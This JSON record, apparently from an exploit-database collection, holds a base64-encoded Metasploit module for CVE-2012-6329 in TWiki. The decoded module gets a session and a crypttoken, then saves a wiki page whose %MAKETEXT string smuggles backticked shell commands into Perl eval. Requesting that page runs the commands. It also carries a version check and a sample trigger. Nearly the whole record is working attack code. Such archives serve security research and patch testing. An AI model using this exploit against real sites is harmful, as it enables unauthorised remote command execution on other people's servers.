{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBmaWxlIGlzIHBhcnQgb2YgdGhlIE1ldGFzcGxvaXQgRnJhbWV3b3JrIGFuZCBtYXkgYmUgc3ViamVjdCB0bw0KIyByZWRpc3RyaWJ1dGlvbiBhbmQgY29tbWVyY2lhbCByZXN0cmljdGlvbnMuIFBsZWFzZSBzZWUgdGhlIE1ldGFzcGxvaXQNCiMgd2ViIHNpdGUgZm9yIG1vcmUgaW5mb3JtYXRpb24gb24gbGljZW5zaW5nIGFuZCB0ZXJtcyBvZiB1c2UuDQojICAgaHR0cDovL21ldGFzcGxvaXQuY29tLw0KIyMNCg0KcmVxdWlyZSAnbXNmL2NvcmUnDQoNCmNsYXNzIE1ldGFzcGxvaXQzIDwgTXNmOjpFeHBsb2l0OjpSZW1vdGUNCglSYW5rID0gRXhjZWxsZW50UmFua2luZw0KDQoJaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OlJlbW90ZTo6SHR0cENsaWVudA0KDQoJZGVmIGluaXRpYWxpemUoaW5mbyA9IHt9KQ0KCQlzdXBlcih1cGRhdGVfaW5mbyhpbmZvLA0KCQkJJ05hbWUnICAgICAgICAgICA9PiAnVFdpa2kgTUFLRVRFWFQgUmVtb3RlIENvbW1hbmQgRXhlY3V0aW9uJywNCgkJCSdEZXNjcmlwdGlvbicgICAgPT4gJXF7DQoJCQkJCVRoaXMgbW9kdWxlIGV4cGxvaXRzIGEgdnVsbmVyYWJpbGl0eSBpbiB0aGUgTUFLRVRFWFQgVHdpa2kgdmFyaWFibGUuIEJ5IHVzaW5nIGENCgkJCQlzcGVjaWFsbHkgY3JhZnRlZCBNQUtFVEVYVCwgYSBtYWxpY2lvdXMgdXNlciBjYW4gZXhlY3V0ZSBzaGVsbCBjb21tYW5kcyBzaW5jZSB1c2VyDQoJCQkJaW5wdXQgaXMgcGFzc2VkIHRvIHRoZSBQZXJsICJldmFsIiBjb21tYW5kIHdpdGhvdXQgZmlyc3QgYmVpbmcgc2FuaXRpemVkLiBUaGUNCgkJCQlwcm9ibGVtIGlzIGNhdXNlZCBieSBhbiB1bmRlcmx5aW5nIHNlY3VyaXR5IGlzc3VlIGluIHRoZSBDUEFOOkxvY2FsZTo6TWFrZXRleHQNCgkJCQltb2R1bGUuIFRoaXMgd29ya3MgaW4gVFdpa2kgc2l0ZXMgdGhhdCBoYXZlIHVzZXIgaW50ZXJmYWNlIGxvY2FsaXphdGlvbiBlbmFibGVkDQoJCQkJKFVzZXJJbnRlcmZhY2VJbnRlcm5hdGlvbmFsaXNhdGlvbiB2YXJpYWJsZSBzZXQpLg0KDQoJCQkJSWYgVVNFUk5BTUUgYW5kIFBBU1NXT1JEIGFyZW4ndCBwcm92aWRlZCwgYW5vbnltb3VzIGFjY2VzcyB3aWxsIGJlIHRyaWVkLiBBbHNvLA0KCQkJCWlmIHRoZSAnVHdpa2lQYWdlJyBvcHRpb24gaXNuJ3QgcHJvdmlkZWQsIHRoZSBtb2R1bGUgd2lsbCB0cnkgdG8gY3JlYXRlIGEgcmFuZG9tDQoJCQkJcGFnZSBvbiB0aGUgU2FuZEJveCBzcGFjZS4gIFRoZSBtb2R1bGVzIGhhcyBiZWVuIHRlc3RlZCBzdWNjZXNzZnVsbHkgb24NCgkJCQlUV2lraSA1LjEuMiBhcyBkaXN0cmlidXRlZCB3aXRoIHRoZSBvZmZpY2lhbCBUV2lraS1WTS01LjEuMi0xIHZpcnR1YWwgbWFjaGluZS4NCgkJCX0sDQoJCQknQXV0aG9yJyAgICAgICAgID0+DQoJCQkJWw0KCQkJCQknR2VvcmdlIENsYXJrJywgIyBvcmlnaW5hbCBkaXNjb3ZlcnkNCgkJCQkJJ2p1YW4gdmF6cXVleicgIyBNZXRhc3Bsb2l0IG1vZHVsZQ0KCQkJCV0sDQoJCQknTGljZW5zZScgICAgICAgID0+IE1TRl9MSUNFTlNFLA0KCQkJJ1JlZmVyZW5jZXMnICAgICA9Pg0KCQkJCVsNCgkJCQkJWyAnQ1ZFJywgJzIwMTItNjMyOScgXSwNCgkJCQkJWyAnT1NWREInLCAnODg0NjAnIF0sDQoJCQkJCVsgJ0JJRCcsICc1Njk1MCcgXSwNCgkJCQkJWyAnVVJMJywgJ2h0dHA6Ly90d2lraS5vcmcvY2dpLWJpbi92aWV3L0NvZGV2L1NlY3VyaXR5QWxlcnQtQ1ZFLTIwMTItNjMyOScgXQ0KCQkJCV0sDQoJCQknUHJpdmlsZWdlZCcgICAgID0+IGZhbHNlLCAjIHdlYiBzZXJ2ZXIgY29udGV4dA0KCQkJJ1BheWxvYWQnICAgICAgICA9Pg0KCQkJCXsNCgkJCQkJJ0Rpc2FibGVOb3BzJyA9PiB0cnVlLA0KCQkJCQknU3BhY2UnICAgICAgID0+IDEwMjQsDQoJCQkJCSdDb21wYXQnICAgICAgPT4NCgkJCQkJCXsNCgkJCQkJCQknUGF5bG9hZFR5cGUnID0+ICdjbWQnLA0KCQkJCQkJCSdSZXF1aXJlZENtZCcgPT4gJ2dlbmVyaWMgcnVieSBweXRob24gYmFzaCB0ZWxuZXQnDQoJCQkJCQl9DQoJCQkJfSwNCgkJCSdQbGF0Zm9ybScgICAgICAgPT4gWyAndW5peCcgXSwNCgkJCSdBcmNoJyAgICAgICAgICAgPT4gQVJDSF9DTUQsDQoJCQknVGFyZ2V0cycgICAgICAgID0+IFtbICdBdXRvbWF0aWMnLCB7IH1dXSwNCgkJCSdEaXNjbG9zdXJlRGF0ZScgPT4gJ0RlYyAxNSAyMDEyJywNCgkJCSdEZWZhdWx0VGFyZ2V0JyAgPT4gMCkpDQoNCgkJcmVnaXN0ZXJfb3B0aW9ucygNCgkJCVsNCgkJCQlPcHRTdHJpbmcubmV3KCdUQVJHRVRVUkknLCBbIHRydWUsICJUV2lraSBiYXNlIHBhdGgiLCAiLyIgXSksDQoJCQkJT3B0U3RyaW5nLm5ldygnVHdpa2lQYWdlJywgWyBmYWxzZSwgIlRXaWtpIFBhZ2Ugd2l0aCBlZGl0IHBlcm1pc3Npb25zIHRvIGluamVjdCB0aGUgcGF5bG9hZCwgYnkgZGVmYXVsdCByYW5kb20gUGFnZSBvbiBTYW5kYm94IChFeDogL1NhbmRib3gvTXNmVGVzdCkiIF0pLA0KCQkJCU9wdFN0cmluZy5uZXcoJ1VTRVJOQU1FJywgWyBmYWxzZSwgICJUaGUgdXNlciB0byBhdXRoZW50aWNhdGUgYXMgKGFub255bW91cyBpZiB1c2VybmFtZSBub3QgcHJvdmlkZWQpIl0pLA0KCQkJCU9wdFN0cmluZy5uZXcoJ1BBU1NXT1JEJywgWyBmYWxzZSwgICJUaGUgcGFzc3dvcmQgdG8gYXV0aGVudGljYXRlIHdpdGggKGFub255bW91cyBpZiBwYXNzd29yZCBub3QgcHJvdmlkZWQpIiBdKQ0KCQkJXSwgc2VsZi5jbGFzcykNCgllbmQNCg0KCWRlZiBkb19sb2dpbih1c2VybmFtZSwgcGFzc3dvcmQpDQoJCXJlcyA9IHNlbmRfcmVxdWVzdF9jZ2koew0KCQkJJ21ldGhvZCcgICA9PiAnUE9TVCcsDQoJCQkndXJpJyAgICAgID0+ICIje0BiYXNlfWRvL2xvZ2luIiwNCgkJCSd2YXJzX3Bvc3QnID0+DQoJCQkJew0KCQkJCQkndXNlcm5hbWUnID0+IHVzZXJuYW1lLA0KCQkJCQkncGFzc3dvcmQnID0+IHBhc3N3b3JkDQoJCQkJfQ0KCQkJfSkNCg0KCQlpZiBub3QgcmVzIG9yIHJlcy5jb2RlICE9IDMwMiBvciByZXMuaGVhZGVyc1snU2V0LUNvb2tpZSddICF+IC9UV0lLSVNJRD0oWzAtOWEtZl0qKS8NCgkJCXJldHVybiBuaWwNCgkJZW5kDQoNCgkJc2Vzc2lvbiA9ICQxDQoJCXJldHVybiBzZXNzaW9uDQoJZW5kDQoNCglkZWYgaW5qZWN0X2NvZGUoc2Vzc2lvbiwgY29kZSkNCg0KCQl2cHJpbnRfc3RhdHVzKCJSZXRyaWV2aW5nIHRoZSBjcnlwdHRva2VuLi4uIikNCg0KCQlyZXMgPSBzZW5kX3JlcXVlc3RfY2dpKHsNCgkJCSd1cmknICAgICAgPT4gIiN7QGJhc2V9ZG8vZWRpdCN7QHBhZ2V9IiwNCgkJCSdjb29raWUnICAgPT4gIlRXSUtJU0lEPSN7c2Vzc2lvbn0iLA0KCQkJJ3ZhcnNfZ2V0JyA9Pg0KCQkJCXsNCgkJCQkJJ25vd3lzaXd5ZycgPT4gJzEnDQoJCQkJfQ0KCQl9KQ0KDQoJCWlmIG5vdCByZXMgb3IgcmVzLmNvZGUgIT0gMjAwIG9yIHJlcy5ib2R5ICF+IC9uYW1lPSJjcnlwdHRva2VuIiB2YWx1ZT0iKFswLTlhLWZdKikiLw0KCQkJdnByaW50X2Vycm9yKCJFcnJvciByZXRyaWV2aW5nIHRoZSBjcnlwdHRva2VuIikNCgkJCXJldHVybiBuaWwNCgkJZW5kDQoNCgkJY3J5cHR0b2tlbiA9ICQxDQoJCXZwcmludF9nb29kKCJjcnlwdHRva2VuIGZvdW5kOiAje2NyeXB0dG9rZW59IikNCg0KCQlpZiBzZXNzaW9uLmVtcHR5Pw0KCQkJaWYgcmVzLmhlYWRlcnNbJ1NldC1Db29raWUnXSA9fiAvVFdJS0lTSUQ9KFswLTlhLWZdKikvDQoJCQkJc2Vzc2lvbiA9ICQxDQoJCQllbHNlDQoJCQkJdnByaW50X2Vycm9yKCJFcnJvciB1c2luZyBhbm9ueW1vdXMgYWNjZXNzIikNCgkJCQlyZXR1cm4gbmlsDQoJCQllbmQNCgkJZW5kDQoNCgkJdnByaW50X3N0YXR1cygiSW5qZWN0aW5nIHRoZSBwYXlsb2FkLi4uIikNCg0KCQlyZXMgPSBzZW5kX3JlcXVlc3RfY2dpKHsNCgkJCSdtZXRob2QnICAgPT4gJ1BPU1QnLA0KCQkJJ3VyaScgICAgICA9PiAiI3tAYmFzZX1kby9zYXZlI3tAcGFnZX0iLA0KCQkJJ2Nvb2tpZScgICA9PiAiVFdJS0lTSUQ9I3tzZXNzaW9ufSIsDQoJCQkndmFyc19wb3N0JyA9Pg0KCQkJew0KCQkJCSdjcnlwdHRva2VuJyA9PiBjcnlwdHRva2VuLA0KCQkJCSd0ZXh0JyA9PiAiI3tyYW5kX3RleHRfYWxwaGEoMyArIHJhbmQoMykpfSAlTUFLRVRFWFR7XCIje3JhbmRfdGV4dF9hbHBoYSgzICsgcmFuZCgzKSl9IFtfMV0gI3tyYW5kX3RleHRfYWxwaGEoMyArIHJhbmQoMykpfVxcXFwnfTsgYCN7Y29kZX1gOyB7ICNcIiBhcmdzPVwiI3tyYW5kX3RleHRfYWxwaGEoMyArIHJhbmQoMykpfVwifSUiDQoJCQl9DQoJCX0pDQoNCgkJaWYgbm90IHJlcyBvciByZXMuY29kZSAhPSAzMDIgb3IgcmVzLmhlYWRlcnNbJ0xvY2F0aW9uJ10gPX4gL29vcHMvIG9yIHJlcy5oZWFkZXJzWydMb2NhdGlvbiddICF+IC8je0BwYWdlfS8NCgkJCXByaW50X3dhcm5pbmcoIkVycm9yIGluamVjdGluZyB0aGUgcGF5bG9hZCIpDQoJCQlwcmludF9zdGF0dXMgIiN7cmVzLmNvZGV9XG4je3Jlcy5ib2R5fVxuI3tyZXMuaGVhZGVyc1snTG9jYXRpb24nXX0iDQoJCQlyZXR1cm4gbmlsDQoJCWVuZA0KDQoJCWxvY2F0aW9uID0gVVJJKHJlcy5oZWFkZXJzWydMb2NhdGlvbiddKS5wYXRoDQoJCXByaW50X2dvb2QoIlBheWxvYWQgaW5qZWN0ZWQgb24gI3tsb2NhdGlvbn0iKQ0KDQoJCXJldHVybiBsb2NhdGlvbg0KCWVuZA0KDQoJZGVmIGNoZWNrDQoJCUBiYXNlID0gdGFyZ2V0X3VyaS5wYXRoDQoJCUBiYXNlIDw8ICcvJyBpZiBAYmFzZVstMSwgMV0gIT0gJy8nDQoNCgkJcmVzID0gc2VuZF9yZXF1ZXN0X2NnaSh7DQoJCQkndXJpJyAgICAgID0+ICIje0BiYXNlfWRvL3ZpZXcvVFdpa2kvV2ViSG9tZSINCgkJfSkNCg0KCQlpZiBub3QgcmVzIG9yIHJlcy5jb2RlICE9IDIwMA0KCQkJcmV0dXJuIEV4cGxvaXQ6OkNoZWNrQ29kZTo6VW5rbm93bg0KCQllbmQNCg0KCQlpZiByZXMuYm9keSA9fiAvVGhpcyBzaXRlIGlzIHJ1bm5pbmcgVFdpa2kgdmVyc2lvbi4qVFdpa2ktKFxkXC5cZFwuXGQpLw0KCQkJdmVyc2lvbiA9ICQxDQoJCQlwcmludF9zdGF0dXMoIlZlcnNpb24gZm91bmQ6ICN7dmVyc2lvbn0iKQ0KCQkJaWYgdmVyc2lvbiA8ICI1LjEuMyINCgkJCQlyZXR1cm4gRXhwbG9pdDo6Q2hlY2tDb2RlOjpBcHBlYXJzDQoJCQllbHNlDQoJCQkJcmV0dXJuIEV4cGxvaXQ6OkNoZWNrQ29kZTo6U2FmZQ0KCQkJZW5kDQoJCWVuZA0KDQoJCXJldHVybiBFeHBsb2l0OjpDaGVja0NvZGU6OkRldGVjdGVkDQoJZW5kDQoNCg0KCWRlZiBleHBsb2l0DQoNCgkJIyBJbml0IHZhcmlhYmxlcw0KCQlAcGFnZSA9ICcnDQoNCgkJaWYgZGF0YXN0b3JlWydUd2lraVBhZ2UnXSBhbmQgbm90IGRhdGFzdG9yZVsnVHdpa2lQYWdlJ10uZW1wdHk/DQoJCQlAcGFnZSA8PCAnLycgaWYgZGF0YXN0b3JlWydUd2lraVBhZ2UnXVswXSAhPSAnLycNCgkJCUBwYWdlIDw8IGRhdGFzdG9yZVsnVHdpa2lQYWdlJ10NCgkJZWxzZQ0KCQkJQHBhZ2UgPDwgIi9TYW5kYm94LyN7cmFuZF90ZXh0X2FscGhhX2xvd2VyKDMpLmNhcGl0YWxpemV9I3tyYW5kX3RleHRfYWxwaGFfbG93ZXIoMykuY2FwaXRhbGl6ZX0iDQoJCWVuZA0KDQoJCUBiYXNlID0gdGFyZ2V0X3VyaS5wYXRoDQoJCUBiYXNlIDw8ICcvJyBpZiBAYmFzZVstMSwgMV0gIT0gJy8nDQoNCgkJIyBMb2dpbiBpZiBuZWVkZWQNCgkJaWYgKGRhdGFzdG9yZVsnVVNFUk5BTUUnXSBhbmQNCgkJCW5vdCBkYXRhc3RvcmVbJ1VTRVJOQU1FJ10uZW1wdHk/IGFuZA0KCQkJZGF0YXN0b3JlWydQQVNTV09SRCddIGFuZA0KCQkJbm90IGRhdGFzdG9yZVsnUEFTU1dPUkQnXS5lbXB0eT8pDQoJCQlwcmludF9zdGF0dXMoIlRyeWluZyBsb2dpbiB0byBnZXQgc2Vzc2lvbiBJRC4uLiIpDQoJCQlzZXNzaW9uID0gZG9fbG9naW4oZGF0YXN0b3JlWydVU0VSTkFNRSddLCBkYXRhc3RvcmVbJ1BBU1NXT1JEJ10pDQoJCWVsc2UNCgkJCXByaW50X3N0YXR1cygiVXNpbmcgYW5vbnltb3VzIGFjY2Vzcy4uLiIpDQoJCQlzZXNzaW9uID0gIiINCgkJZW5kDQoNCgkJaWYgbm90IHNlc3Npb24NCgkJCWZhaWxfd2l0aChFeHBsb2l0OjpGYWlsdXJlOjpVbmtub3duLCAiRXJyb3IgZ2V0dGluZyBhIHNlc3Npb24gSUQiKQ0KCQllbmQNCg0KCQkjIEluamVjdCBwYXlsb2FkDQoJCXByaW50X3N0YXR1cygiVHJ5aW5nIHRvIGluamVjdCB0aGUgcGF5bG9hZCBvbiAje0BwYWdlfS4uLiIpDQoJCXJlcyA9IGluamVjdF9jb2RlKHNlc3Npb24sIHBheWxvYWQuZW5jb2RlZCkNCgkJaWYgbm90IHJlcw0KCQkJZmFpbF93aXRoKEV4cGxvaXQ6OkZhaWx1cmU6OlVua25vd24sICJFcnJvciBpbmplY3RpbmcgdGhlIHBheWxvYWQiKQ0KCQllbmQNCg0KCQkjIEV4ZWN1dGUgcGF5bG9hZA0KCQlwcmludF9zdGF0dXMoIkV4ZWN1dGluZyB0aGUgcGF5bG9hZCB0aHJvdWdoICN7cmVzfS4uLiIpDQoJCXJlcyA9IHNlbmRfcmVxdWVzdF9jZ2koew0KCQkJJ3VyaScgICAgICA9PiByZXMsDQoJCQknY29va2llJyAgID0+ICJUV0lLSVNJRD0je3Nlc3Npb259Ig0KCQl9KQ0KCQlpZiBub3QgcmVzIG9yIHJlcy5jb2RlICE9IDIwMCBvciByZXMuYm9keSAhfiAvSEFTSC8NCgkJCWZhaWxfd2l0aChFeHBsb2l0OjpGYWlsdXJlOjpVbmtub3duLCAiRXJyb3IgZXhlY3V0aW5nIHRoZSBwYXlsb2FkIikNCgkJZW5kDQoNCgkJcHJpbnRfZ29vZCgiRXhwbG9pdGF0aW9uIHdhcyBzdWNjZXNzZnVsIikNCg0KCWVuZA0KDQplbmQNCg0KPWJlZ2luDQoNCiogVHJpZ2dlcjoNCg0KJU1BS0VURVhUeyJ0ZXN0IFtfMV0gc2Vjb25kdGVzdFxcJ307IGB0b3VjaCAvdG1wL21zZi50eHRgOyB7ICMiIGFyZ3M9Im1zZiJ9JQ0KDQo9ZW5k", 
    "filename": "platforms/unix/remote/23579.rb", 
    "id": "23579", 
    "cves": [
        "CVE-2012-6329"
    ]
}